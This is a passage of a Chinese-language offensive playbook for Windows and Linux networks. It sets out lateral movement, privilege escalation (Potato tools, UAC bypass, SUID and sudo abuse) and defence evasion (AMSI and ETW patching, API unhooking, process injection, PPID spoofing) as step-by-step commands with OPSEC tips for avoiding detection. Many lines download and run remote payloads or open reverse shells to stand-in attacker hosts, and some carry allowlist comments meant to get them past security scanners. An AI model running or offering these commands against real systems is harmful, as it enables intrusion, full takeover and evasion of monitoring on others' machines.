_使用smbexec执行命令_
```
smbexec.py domain/user:password@target
```

**2. 通过服务执行**  _[windows]_
_创建并启动服务_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```

---

### ATExec横向移动  `lateral-atexec`
通过计划任务执行命令
子类：**计划任务** · tags: `at` `scheduled` `lateral`

**前置条件：** 计划任务权限；管理员权限

**攻击链：**

**1. Impacket atexec**  _[linux]_
_使用atexec执行命令_
```
atexec.py domain/user:password@target "whoami"
```

**2. schtasks**  _[windows]_
_创建远程计划任务_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```

---

### WinRS横向移动  `lateral-winrs`
通过WinRS执行远程命令
子类：**WinRS** · tags: `winrs` `lateral` `windows`

**前置条件：** WinRM启用；有效凭证

**攻击链：**

**1. 执行命令**  _[windows]_
_远程执行命令_
```
winrs -r:target -u:user -p:password "whoami"
```

**2. 获取Shell**  _[windows]_
_获取远程CMD_
```
winrs -r:target -u:user -p:password "cmd"
```

---

### Excel DCOM横向移动  `lateral-dcom-excel`
利用Excel DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `excel` `lateral`

**前置条件：** 目标安装Excel；DCOM权限

**攻击链：**

**1. Excel DCOM激活**  _[windows]_
_激活Excel DCOM对象_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**2. 执行命令**  _[windows]_
_通过Excel执行命令_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```

**3. Impacket DCOM**  _[linux]_
_使用Impacket执行_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```

---

### MMC DCOM横向移动  `lateral-dcom-mmc`
利用MMC DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `mmc` `lateral`

**前置条件：** 目标安装MMC；DCOM权限

**攻击链：**

**1. MMC20.Application**  _[windows]_
_使用MMC执行命令_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

**2. Impacket执行**  _[linux]_
_使用Impacket_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```

---

### RDP Relay攻击  `rdp-relay`
RDP中继攻击技术
子类：**RDP** · tags: `rdp` `relay` `lateral`

**前置条件：** RDP服务可访问；存在NTLM认证

**攻击链：**

**1. 设置中继**  _[linux]_
_设置RDP中继服务器_
```
使用Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
或使用rdp_relay.py
```

**2. 诱导连接**
_诱导用户连接_
```
诱导用户连接到攻击者控制的RDP服务器:
1. 发送恶意RDP文件
2. 用户连接时中继到目标
```

**3. PetitPotam组合**  _[linux]_
_PetitPotam + RDP Relay_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
结合NTLM中继攻击ADCS
```

---


## 权限提升

### 令牌窃取与模拟  `privilege-token`
窃取和模拟Windows访问令牌
子类：**令牌操作** · tags: `token` `privilege` `impersonation` `windows`

**前置条件：** 已获得目标机器权限；SeImpersonatePrivilege权限；Windows系统

**攻击链：**

**1. 列出令牌**  _[windows]_
_列出系统中所有可用令牌_
```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

**2. 窃取令牌**  _[windows]_
_窃取指定用户的令牌_
```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

**3. JuicyPotato攻击**  _[windows]_
_JuicyPotato提权（需要SeImpersonatePrivilege）_
```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

**4. PrintSpoofer**  _[windows]_
_PrintSpoofer提权_
```
PrintSpoofer.exe -i -c cmd
```

**5. GodPotato**  _[windows]_
_GodPotato提权，支持更多Windows版本_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**EDR 绕过变体：**

**1. RoguePotato**
_RoguePotato，绕过更多限制_
```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```

**分析：** 令牌窃取成功后可以模拟高权限用户身份执行操作。

**OPSEC：** Potato系列工具利用DCOM机制；需要SeImpersonatePrivilege权限；不同Windows版本需要不同的CLSID

---

### Windows权限提升  `windows-privesc`
Windows系统提权技术
子类：**Windows** · tags: `privesc` `windows` `privilege`

**前置条件：** 普通用户权限；系统漏洞

**攻击链：**

**1. 检查提权向量**  _[windows]_
_检查当前权限_
```
whoami /priv
whoami /groups
```

**2. 使用WinPEAS**  _[windows]_
_自动化提权检查_
```
winpeas.exe
```

**3. 检查服务权限**  _[windows]_
_检查可写服务_
```
accesschk.exe -uwcqv "Everyone" *
```

**4. 检查未引用服务路径**  _[windows]_
_查找未引用服务路径_
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```

---

### Linux权限提升  `linux-privesc`
Linux系统提权技术
子类：**Linux** · tags: `privesc` `linux` `privilege`

**前置条件：** 普通用户权限；系统漏洞

**攻击链：**

**1. 检查SUID**  _[linux]_
_查找SUID文件_
```
find / -perm -4000 -type f 2>/dev/null
```

**2. 检查Sudo**  _[linux]_
_检查sudo权限_
```
sudo -l
```

**3. 检查Cron**  _[linux]_
_检查计划任务_
```
cat /etc/crontab
ls -la /etc/cron*
```

**4. 使用LinPEAS**  _[linux]_
_自动化提权检查_
```
linpeas.sh
```

---

### UAC绕过  `uac-bypass`
绕过Windows用户账户控制
子类：**UAC** · tags: `uac` `bypass` `windows`

**前置条件：** 管理员组成员；UAC启用

**攻击链：**

**1. Fodhelper**  _[windows]_
_通过fodhelper绕过UAC_
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

**2. Eventvwr**  _[windows]_
_通过eventvwr绕过UAC_
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

**3. 使用UACME**  _[windows]_
_使用UACME工具_
```
Akagi64.exe 23 cmd.exe
```

---

### DLL劫持  `dll-hijack`
通过DLL劫持提权
子类：**DLL** · tags: `dll` `hijack` `privesc`

**前置条件：** 可写目录；DLL搜索顺序

**攻击链：**

**1. 查找DLL劫持**  _[windows]_
_监控进程加载的DLL_
```
使用Procmon监控DLL加载
```

**2. 创建恶意DLL**  _[linux]_
_生成恶意DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**3. 放置DLL**  _[windows]_
_放置DLL到目标位置_
```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```

---

### 服务提权  `service-exploit`
通过服务漏洞提权
子类：**服务** · tags: `service` `privesc` `windows`

**前置条件：** 服务修改权限；可写服务路径

**攻击链：**

**1. 检查服务权限**  _[windows]_
_检查用户可修改的服务_
```
accesschk.exe -uwcqv "Users" *
```

**2. 修改服务路径**  _[windows]_
_修改服务执行路径_
```
sc config VulnerableService binPath= "cmd /c whoami"
```

**3. 重启服务**  _[windows]_
_重启服务执行命令_
```
sc stop VulnerableService
sc start VulnerableService
```

---

### AlwaysInstallElevated提权  `always-install`
利用AlwaysInstallElevated提权
子类：**MSI** · tags: `msi` `alwaysinstall` `privesc`

**前置条件：** AlwaysInstallElevated启用

**攻击链：**

**1. 检查设置**  _[windows]_
_检查是否启用_
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**2. 创建MSI**  _[linux]_
_生成恶意MSI_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

**3. 安装MSI**  _[windows]_
_安装MSI执行代码_
```
msiexec /quiet /qn /i evil.msi
```

---

### Juicy Potato提权  `juicy-potato`
利用COM对象和SeImpersonatePrivilege提权
子类：**Potato** · tags: `juicy-potato` `com` `privesc`

**前置条件：** SeImpersonatePrivilege；Windows < 2019

**攻击链：**

**1. 检查权限**  _[windows]_
_检查SeImpersonatePrivilege_
```
whoami /priv | findstr SeImpersonate
```

**2. 执行JuicyPotato**  _[windows]_
_使用JuicyPotato提权_
```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

---

### PrintSpoofer提权  `printspoofer`
利用打印机服务提权
子类：**PrintSpoofer** · tags: `printspoofer` `privesc` `windows`

**前置条件：** SeImpersonatePrivilege

**攻击链：**

**1. 执行PrintSpoofer**  _[windows]_
_使用PrintSpoofer提权_
```
PrintSpoofer.exe -i -c cmd
```

**2. 指定命令**  _[windows]_
_执行指定命令_
```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```

---

### GodPotato提权  `godpotato`
GodPotato提权工具
子类：**GodPotato** · tags: `godpotato` `privesc` `windows`

**前置条件：** SeImpersonatePrivilege

**攻击链：**

**1. 执行GodPotato**  _[windows]_
_使用GodPotato提权_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**2. 反向Shell**  _[windows]_
_执行反向Shell_
```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```

---

### SUID提权  `suid-exploit`
利用SUID文件提权
子类：**SUID** · tags: `suid` `privesc` `linux`

**前置条件：** 存在SUID文件；可利用程序

**攻击链：**

**1. 查找SUID**  _[linux]_
_查找所有SUID文件_
```
find / -perm -4000 -type f 2>/dev/null
```

**2. 常见可利用程序**  _[linux]_
_常见SUID利用方法_
```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

**3. GTFOBins**  _[linux]_
_查找程序利用方法_
```
参考GTFOBins网站查找可利用程序
```

---

### Sudo提权  `sudo-exploit`
利用Sudo配置提权
子类：**Sudo** · tags: `sudo` `privesc` `linux`

**前置条件：** Sudo权限配置不当

**攻击链：**

**1. 检查Sudo权限**  _[linux]_
_列出可执行的sudo命令_
```
sudo -l
```

**2. 常见利用**  _[linux]_
_常见sudo利用方法_
```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

**3. CVE-2021-3156**  _[linux]_
_Baron Samedit漏洞_
```
利用sudo堆溢出漏洞
```

---

### Cron提权  `cron-exploit`
利用Cron任务提权
子类：**Cron** · tags: `cron` `privesc` `linux`

**前置条件：** 可写Cron脚本；通配符注入

**攻击链：**

**1. 检查Cron任务**  _[linux]_
_查看计划任务_
```
cat /etc/crontab
ls -la /etc/cron*
```

**2. 检查脚本权限**  _[linux]_
_检查Cron脚本权限_
```
ls -la /path/to/cron/script.sh
```

**3. 通配符注入**  _[linux]_
_利用tar通配符注入_
```
在Cron目录创建: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

---

### 内核漏洞提权  `kernel-exploit`
利用内核漏洞提权
子类：**内核** · tags: `kernel` `privesc` `exploit`

**前置条件：** 存在内核漏洞；可编译/执行exploit

**攻击链：**

**1. 检查内核版本**  _[linux]_
_查看内核版本信息_
```
uname -a
cat /proc/version
```

**2. 搜索exploit**  _[linux]_
_搜索内核exploit_
```
searchsploit kernel VERSION
```

**3. 常见内核漏洞**  _[linux]_
_常见内核提权漏洞_
```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```

---

### Potato系列提权攻击  `potato-attack`
利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM
子类：**Potato提权** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

**前置条件：** 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限；常见于IIS AppPool、SQL Server、各类服务账户

**攻击链：**

**1. 检查当前权限**  _[windows]_
_首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限_
```
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%
```

**2. JuicyPotato (Windows Server 2016/2019)**  _[windows]_
_JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令_
```
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```

**3. PrintSpoofer (Windows 10/Server 2019+)**  _[windows]_
_PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows_
```
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe
```

**4. Sweet Potato (多技术集成)**  _[windows]_
_SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式_
```
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```

**5. GodPotato (全版本通杀)**  _[windows]_
_GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种_
```
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"  # security-allowlist: SEC005
```

**6. RoguePotato (远程场景)**  _[windows]_
_RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继_
```
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```

**7. Potato选型决策流程**  _[windows]_
_根据目标系统版本选择合适的Potato变种工具_
```
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
```

**EDR 绕过变体：**

**1. 绕过EDR检测的Potato技巧**  _[windows]_
_通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测_
```
# 1. 重命名二进制文件
ren GodPotato.exe svcutil.exe

# 2. 使用.NET反射加载(无文件落地)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. 使用SharpToken替代(较新工具,签名较少)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```

**分析：** Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。

**OPSEC：** 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式

---


## 免杀与规避

### PowerShell免杀  `evasion-powershell`
PowerShell脚本免杀技术
子类：**PowerShell** · tags: `powershell` `evasion` `obfuscation`

**前置条件：** 目标机器访问权限；Windows系统

**攻击链：**

**1. 编码执行**  _[windows]_
_Base64编码执行_
```
powershell -enc BASE64_ENCODED_COMMAND
```

**2. 远程加载**  _[windows]_
_远程加载脚本_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")  # security-allowlist: SEC005
```

**3. 混淆变量名**  _[windows]_
_变量名混淆_
```
1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"  # security-allowlist: SEC004
```

**4. 无文件执行**  _[windows]_
_隐藏窗口无配置文件执行_
```
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"  # security-allowlist: SEC005
```

**EDR 绕过变体：**

**1. 降级执行**
_使用PowerShell v2绕过日志_
```
powershell -version 2 -c "command"
```

**分析：** PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。

**OPSEC：** PowerShell日志可能记录命令；考虑禁用日志；使用混淆技术

---

### AMSI绕过  `amsi-bypass`
绕过反恶意软件扫描接口
子类：**AMSI绕过** · tags: `amsi` `bypass` `evasion`

**前置条件：** PowerShell环境；AMSI启用

**攻击链：**

**1. 反射绕过**  _[windows]_
_通过反射禁用AMSI_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

**2. 内存修补**  _[windows]_
_混淆版本绕过_
```
$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
```

**3. DLL劫持**  _[windows]_
_通过DLL劫持绕过_
```
替换或劫持amsi.dll
```

**4. 使用工具**  _[windows]_
_使用现成工具_
```
Import-Module .\AmsiBypass.ps1
Invoke-AmsiBypass
```

---

### ETW Patch绕过  `etw-patch`
禁用ETW监控
子类：**ETW** · tags: `etw` `bypass` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. PowerShell禁用ETW**  _[windows]_
_PowerShell禁用ETW_
```
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
或
[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
$etw.SetEnabled(0)
```

**2. C#禁用ETW**  _[windows]_
_C#禁用ETW_
```
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
```

**3. 修补ntdll**  _[windows]_
_修补EtwEventWrite_
```
$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)
```

---

### API Unhooking  `api-unhooking`
移除EDR的API Hook
子类：**Unhooking** · tags: `unhooking` `hook` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. 从磁盘还原**  _[windows]_
_从磁盘读取干净DLL_
```
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$base = $proc.MainModule.BaseAddress
# 找到.text段并覆盖
```

**2. 从KnownDlls还原**  _[windows]_
_从KnownDlls还原_
```
$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
# 复制干净的代码段
```

**3. Hell's Gate**  _[windows]_
_Hell's Gate技术_
```
通过系统调用号直接调用:
1. 解析NTDLL获取系统调用号
2. 直接执行syscall
3. 绕过用户模式Hook
```

---

### 进程注入  `process-injection`
将代码注入到其他进程
子类：**进程注入** · tags: `injection` `process` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. 经典DLL注入**  _[windows]_
_DLL注入_
```
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)
```

**2. Process Hollowing**  _[windows]_
_进程镂空_
```
1. CreateProcess(CREATE_SUSPENDED)
2. NtUnmapViewOfSection
3. VirtualAllocEx
4. WriteProcessMemory
5. ResumeThread
```

**3. APC注入**  _[windows]_
_APC队列注入_
```
$threadId = $proc.Threads[0].Id
$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)
```

---

### AppLocker绕过  `applocker-bypass`
绕过AppLocker应用程序限制
子类：**AppLocker** · tags: `applocker` `bypass` `evasion`

**前置条件：** AppLocker限制环境

**攻击链：**

**1. 使用白名单路径**  _[windows]_
_使用白名单可执行文件_
```
C:\Windows\System32\spoolsv.exe
C:\Windows\System32\svchost.exe
C:\Program Files\Internet Explorer\ieexec.exe
```

**2. LOLBAS利用**  _[windows]_
_LOLBAS技术_
```
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
mshta.exe http://attacker.com/shell.hta
certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
```

**3. InstallUtil**  _[windows]_
_InstallUtil绕过_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```

**4. MSBuild**  _[windows]_
_MSBuild执行代码_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
```

---

### BlockDLLs技术  `evasion-blockdlls`
阻止非微软DLL加载
子类：**BlockDLLs** · tags: `evasion` `blockdlls` `edr`

**前置条件：** Windows系统；Cobalt Strike或其他工具

**攻击链：**

**1. Cobalt Strike BlockDLLs**  _[windows]_
_启用BlockDLLs_
```
beacon> blockdlls start
阻止非微软签名的DLL加载
beacon> blockdlls stop
恢复DLL加载
```

**2. 进程创建时启用**  _[windows]_
_进程创建时启用_
```
使用CREATE_SUSPENDED标志创建进程
设置ProcessSignaturePolicy
阻止EDR DLL注入
```

**3. C#实现**  _[windows]_
_C#实现BlockDLLs_
```
[DllImport("kernel32.dll")]
static extern bool SetProcessMitigationPolicy(...);
ProcessSignaturePolicy policy = new ProcessSignaturePolicy();
policy.SignatureLevel = 0x0F;
SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
```

---

### Shellcode加密  `evasion-shellcode-encrypt`
加密Shellcode绕过静态检测
子类：**Shellcode加密** · tags: `evasion` `shellcode` `encrypt`

**前置条件：** Shellcode；加密工具

**攻击链：**

**1. AES加密Shellcode**
_AES加密_
```
使用工具加密:
python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
生成加密的Shellcode和解密代码
```

**2. XOR加密**
_XOR加密_
```
简单XOR加密:
for i in range(len(shellcode)):
    encoded[i] = shellcode[i] ^ key[i % len(key)]
运行时解密执行
```

**3. RC4加密**
_RC4加密_
```
使用RC4加密Shellcode:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
运行时使用相同密钥解密
```

**4. 多态加密**
_多态加密_
```
每次生成不同的解密代码:
- 随机密钥
- 随机解密顺序
- 添加垃圾指令
- 控制流混淆
```

---

### 进程伪装  `evasion-process-masq`
伪装进程名称和路径
子类：**进程伪装** · tags: `evasion` `process` `masquerade`

**前置条件：** Windows系统

**攻击链：**

**1. PPID欺骗**  _[windows]_
_PPID欺骗_
```
Cobalt Strike:
beacon> ppid 1234
设置父进程ID为合法进程
beacon> run [command]
新进程继承合法父进程
```

**2. 进程参数欺骗**  _[windows]_
_参数欺骗_
```
CreateProcess参数:
- lpApplicationName: 合法程序路径
- lpCommandLine: 包含恶意命令
- 显示为合法进程
```

**3. 进程镂空**  _[windows]_
_进程镂空_
```
1. 创建合法进程(挂起状态)
2. 写入恶意代码
3. 恢复线程执行
进程名显示为合法程序
```

---

### PPID欺骗  `evasion-ppid-spoof`
伪造父进程ID
子类：**PPID欺骗** · tags: `evasion` `ppid` `spoofing`

**前置条件：** Windows系统；父进程句柄

**攻击链：**

**1. PowerShell实现**  _[windows]_
_PowerShell PPID欺骗_
```
$parent = Get-Process -Name explorer
$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName = "cmd.exe"
$pi.ParentProcessId = $parent.Id
[System.Diagnostics.Process]::Start($pi)
```

**2. C#实现**  _[windows]_
_C#实现_
```
[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}
使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike实现_
```
beacon> ppid [explorer_pid]
beacon> run notepad.exe
新进程父进程为explorer.exe
```

---

### DLL侧加载  `evasion-dll-sideloading`
利用DLL搜索顺序加载恶意DLL
子类：**DLL侧加载** · tags: `evasion` `dll` `sideloading`

**前置条件：** Windows系统；可执行文件

**攻击链：**

**1. DLL劫持**  _[windows]_
_DLL劫持原理_
```
1. 找到可执行文件加载的DLL
2. 将恶意DLL放在搜索路径优先位置
3. 执行程序时加载恶意DLL
```

**2. DLL转发**  _[windows]_
_DLL转发_
```
#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
导出原始DLL的函数
同时执行恶意代码
```

**3. 常见目标**  _[windows]_
_常见目标DLL_
```
常见DLL劫持目标:
- version.dll
- dwmapi.dll
- uxtheme.dll
- cryptsp.dll
- winmm.dll
```

---

### 参数欺骗  `evasion-arg-spoofing`
欺骗进程参数显示
子类：**参数欺骗** · tags: `evasion` `argument` `spoofing`

**前置条件：** Windows系统

**攻击链：**

**1. 命令行欺骗**  _[windows]_
_命令行欺骗_
```
CreateProcess参数:
lpApplicationName = "C:\Windows\System32\cmd.exe"
lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
实际执行恶意命令
```

**2. 环境变量欺骗**  _[windows]_
_环境变量欺骗_
```
使用环境变量隐藏参数:
set EVIL=malicious_command
cmd /c %EVIL%
进程列表不显示实际命令
```

**3. PEB修改**  _[windows]_
_PEB修改_
```
修改PEB中的命令行:
1. 创建进程
2. 修改PEB中的CommandLine缓冲区
3. 进程管理器显示假参数
```

---

### 签名二进制利用  `evasion-signed-binary`
利用微软签名二进制执行代码
子类：**签名二进制** · tags: `evasion` `signed` `lolbin`

**前置条件：** Windows系统

**攻击链：**

**1. MSBuild**  _[windows]_
_MSBuild执行_
```
msbuild.exe malicious.csproj
执行嵌入的C#代码
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

**2. InstallUtil**  _[windows]_
_InstallUtil执行_
```
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
执行.NET程序集
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```

**3. Regsvcs/Regasm**  _[windows]_
_Regsvcs/Regasm_
```
regsvcs.exe malicious.dll
regasm.exe malicious.dll
执行.NET程序集
```

**4. Rundll32**  _[windows]_
_Rundll32执行_
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
```

---

### CLR注入  `evasion-clr-injection`
CLR内存注入技术
子类：**CLR注入** · tags: `evasion` `clr` `injection`

**前置条件：** Windows系统；.NET环境

**攻击链：**

**1. CLR内存加载**  _[windows]_
_CLR加载原理_
```
使用CLR接口加载.NET程序集:
1. 获取CLR运行时
2. 创建AppDomain
3. 加载程序集
4. 执行入口点
```

**2. C#实现**  _[windows]_
_C# CLR加载_
```
var clr = new ClrModule();
clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
clr.Execute("Main");
从内存执行.NET程序
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike实现_
```
